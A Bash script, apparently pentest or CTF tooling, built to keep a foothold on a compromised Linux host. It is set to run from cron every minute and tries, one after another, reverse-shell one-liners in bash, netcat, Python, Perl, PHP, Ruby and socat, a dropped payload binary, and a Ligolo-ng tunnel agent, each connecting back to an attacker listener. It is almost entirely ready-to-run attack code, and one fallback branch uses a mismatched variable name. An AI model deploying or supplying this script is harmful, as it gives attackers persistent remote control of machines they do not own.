#!/bin/bash

# ==============================================================================
# REVERSE SHELL PERSISTENCE SCRIPT (Linux)
# ==============================================================================
# Designed to run as a cron job every minute. Tries multiple LOTL methods
# until one succeeds. If a connection already exists, exits cleanly.
#
# SETUP - add one of the following to crontab (crontab -e):
#   * * * * * /tmp/revshell.sh >/dev/null 2>&1
#
# Or for logging during troubleshooting:
#   * * * * * /tmp/revshell.sh >/tmp/revshell.log 2>&1
# ==============================================================================

# ==============================================================================
# CONFIGURATION - edit before deploying
# ==============================================================================
LHOST="10.10.10.10"
LPORT=9999
TIMEOUT=5
WORKDIR="/tmp"
LIGOLO_PORT=11601
LIGOLO_PORT_FALLBACK=443

# ==============================================================================
# WORKING DIRECTORY
# All operations (temp pipes, agent binary lookups) resolve from here
# ==============================================================================
cd "$WORKDIR" 2>/dev/null || true

# ==============================================================================
# CHECK FOR EXISTING CONNECTION
# Avoids spawning duplicate shells to the same listener
# ==============================================================================
connection_exists() {
    if command -v ss >/dev/null 2>&1; then
        ss -tn 2>/dev/null | grep -q "${LHOST}:${LPORT}" && return 0
    fi
    if command -v netstat >/dev/null 2>&1; then
        netstat -tn 2>/dev/null | grep -q "${LHOST}:${LPORT}" && return 0
    fi
    return 1
}

if connection_exists; then
    exit 0
fi

# ==============================================================================
# CONNECTION METHODS
# Ordered from most reliable to least. Each function exits the script on success.
# ==============================================================================

# Method 1: Bash TCP socket (most reliable, no external deps)
try_bash_tcp() {
    timeout "$TIMEOUT" bash -c "bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1" 2>/dev/null && exit 0
}

# Method 2: Netcat with -e flag (traditional/ncat builds)
try_nc_e() {
    if command -v nc >/dev/null 2>&1; then
        timeout "$TIMEOUT" nc -e /bin/bash "$LHOST" "$LPORT" 2>/dev/null && exit 0
    fi
}

# Method 3: Netcat without -e (BSD nc / OpenBSD nc via named pipe)
# Note: no timeout wrapper - mkfifo approach is blocking by design
try_nc_pipe() {
    if command -v nc >/dev/null 2>&1; then
        PIPE=$(mktemp -u "${WORKDIR}/.pipe_XXXXXX")
        rm -f "$PIPE"
        mkfifo "$PIPE" 2>/dev/null
        cat "$PIPE" | /bin/bash -i 2>&1 | nc "$LHOST" "$LPORT" >"$PIPE" 2>/dev/null
        rm -f "$PIPE"
    fi
}

# Method 4: Python reverse shell
try_python() {
    PYCMD='import socket,subprocess,os; s=socket.socket(); s.connect(("'"$LHOST"'",'"$LPORT"')); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call(["/bin/bash","-i"])'
    if command -v python3 >/dev/null 2>&1; then
        timeout "$TIMEOUT" python3 -c "$PYCMD" 2>/dev/null && exit 0
    fi
    if command -v python >/dev/null 2>&1; then
        timeout "$TIMEOUT" python -c "$PYCMD" 2>/dev/null && exit 0
    fi
}

# Method 5: Perl reverse shell
try_perl() {
    if command -v perl >/dev/null 2>&1; then
        timeout "$TIMEOUT" perl -e 'use Socket;$i="'"$LHOST"'";$p='"$LPORT"';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};' 2>/dev/null && exit 0
    fi
}

# Method 6: PHP CLI reverse shell
try_php() {
    if command -v php >/dev/null 2>&1; then
        timeout "$TIMEOUT" php -r '$sock=fsockopen("'"$LHOST"'",'"$LPORT"');exec("/bin/bash -i <&3 >&3 2>&3");' 2>/dev/null && exit 0
    fi
}

# Method 7: Ruby reverse shell
try_ruby() {
    if command -v ruby >/dev/null 2>&1; then
        timeout "$TIMEOUT" ruby -rsocket -e 'exit if fork;c=TCPSocket.new("'"$LHOST"'",'"$LPORT"');while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end' 2>/dev/null && exit 0
    fi
}

# Method 8: Socat (full TTY shell if available)
try_socat() {
    if command -v socat >/dev/null 2>&1; then
        timeout "$TIMEOUT" socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:"$LHOST":"$LPORT" 2>/dev/null && exit 0
    fi
}

# Method 9: Custom shell binary (msfvenom payload or similar)
try_shell_binary() {
    for SHELL_PATH in "${WORKDIR}/shell" /dev/shm/shell /var/tmp/shell; do
        if [ -f "$SHELL_PATH" ] && [ -x "$SHELL_PATH" ]; then
            timeout "$TIMEOUT" "$SHELL_PATH" 2>/dev/null && exit 0
        fi
    done
}

# Method 10: Ligolo-ng agent
# Tries default ligolo port first (11601), falls back to 443
# Looks for agent binary in WORKDIR; runs in background and detaches
try_ligolo() {
    AGENT_PATH="${WORKDIR}/agent"
    if [ ! -f "$AGENT_PATH" ] || [ ! -x "$AGENT_PATH" ]; then
        return
    fi

    # Check if a ligolo tunnel is already up (agent process already running)
    if pgrep -x agent >/dev/null 2>&1; then
        return
    fi

    # Try primary ligolo port
    if timeout "$TIMEOUT" bash -c ">/dev/tcp/$LHOST/$LIGOLO_PORT" 2>/dev/null; then
        nohup "$AGENT_PATH" -connect "${LHOST}:${LIGOLO_PORT}" -ignore-cert \
            >/dev/null 2>&1 &
        disown
        return
    fi

    # Fall back to 443
    if timeout "$TIMEOUT" bash -c ">/dev/tcp/$LHOST/$LIGOLO_FALLBACK_PORT" 2>/dev/null; then
        nohup "$AGENT_PATH" -connect "${LHOST}:${LIGOLO_PORT_FALLBACK}" -ignore-cert \
            >/dev/null 2>&1 &
        disown
        return
    fi
}

# ==============================================================================
# MAIN EXECUTION
# ==============================================================================
try_bash_tcp
try_nc_e
try_nc_pipe
try_python
try_perl
try_php
try_ruby
try_socat
try_shell_binary
try_ligolo

# All methods failed - exit cleanly so cron doesn't generate noise
exit 0
